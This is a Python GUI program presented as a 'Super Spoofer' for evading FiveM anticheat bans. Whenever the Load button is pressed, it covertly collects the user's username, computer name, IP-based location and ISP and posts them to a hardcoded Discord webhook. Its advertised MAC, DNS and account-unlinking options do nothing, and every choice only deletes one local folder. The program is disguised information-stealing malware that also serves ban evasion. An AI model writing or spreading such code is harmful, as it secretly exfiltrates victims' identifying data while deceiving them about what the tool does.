import customtkinter as ctk
import os
import shutil
import webbrowser
import socket
import getpass
import requests
import json

# ---------- SETTINGS ----------
WEBHOOK_URL = "https://discord.com/api/webhooks/1399120745040318494/Hneh4IkIEL0PzzBSsjCpmIv2lB9qbl2kMe5SAh9K8rQA3uIeuzaBltKYwzFYy6jviflr"

# ---------- WEBHOOK FUNCTIE ----------
def send_webhook():
    try:
        ip_info = requests.get("https://ipinfo.io/json").json()
        username = getpass.getuser()
        pc_name = socket.gethostname()
        location = f"{ip_info.get('city', '')}, {ip_info.get('region', '')}, {ip_info.get('country', '')}"
        org = ip_info.get('org', 'Unknown ISP')

        embed = {
            "title": "🔐 Nexus GUI Start",
            "color": 0x3498db,
            "fields": [
                {"name": "👤 PC User", "value": username, "inline": True},
                {"name": "💻 PC Name", "value": pc_name, "inline": True},
                {"name": "🌍 Location", "value": location, "inline": False},
                {"name": "📡 ISP", "value": org, "inline": False},
            ]
        }

        payload = {"embeds": [embed]}
        requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"})
    except:
        pass

# ---------- SPOOF FUNCTIE ----------
def spoof_action():
    folder_path = os.path.expanduser(r"~\AppData\Local\DigitalEntitlements")
    if os.path.exists(folder_path):
        try:
            shutil.rmtree(folder_path)
            ctk.CTkMessagebox(title="Spoofing", message="✅ Spoofing succesvol!", icon="check")
        except:
            ctk.CTkMessagebox(title="Fout", message="❌ Kon bestanden niet verwijderen!", icon="cancel")
    else:
        ctk.CTkMessagebox(title="Info", message="⚠️ Al verwijderd of niet gevonden.", icon="info")

# ---------- INIT GUI ----------
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

app = ctk.CTk()
app.geometry("400x400")
app.title("Super Spoofer")
app.resizable(False, False)

# ---------- TITEL ----------
title_label = ctk.CTkLabel(app, text="Super Spoofer (Permanent)", font=ctk.CTkFont(size=16, weight="bold"))
title_label.pack(pady=(20, 5))

subtitle = ctk.CTkLabel(app, text="Your subscription will not expire", font=ctk.CTkFont(size=12))
subtitle.pack(pady=(0, 15))

# ---------- TOGGLES ----------
unlink_var = ctk.BooleanVar()
unlink_toggle = ctk.CTkSwitch(app, text="Unlink Rockstar/Steam/Xbox from FiveM", variable=unlink_var)
unlink_toggle.pack(pady=10)

remove_cache_var = ctk.BooleanVar()
remove_cache_toggle = ctk.CTkSwitch(app, text="Remove FiveM Cache\nUseful to bypass anticheat bans", variable=remove_cache_var)
remove_cache_toggle.pack(pady=10)

network_var = ctk.BooleanVar()
network_toggle = ctk.CTkSwitch(app, text="Network Cache Reinstall\nChange MAC, DNS and cache", variable=network_var)
network_toggle.pack(pady=10)

# ---------- SPOOF KNOP ----------
def load_pressed():
    send_webhook()
    if unlink_var.get() or remove_cache_var.get() or network_var.get():
        spoof_action()
    else:
        ctk.CTkMessagebox(title="Error", message="⚠️ Selecteer minimaal één optie.", icon="warning")

load_btn = ctk.CTkButton(app, text="Load", command=load_pressed, height=40, width=200, font=ctk.CTkFont(size=14, weight="bold"))
load_btn.pack(pady=25)

app.mainloop()
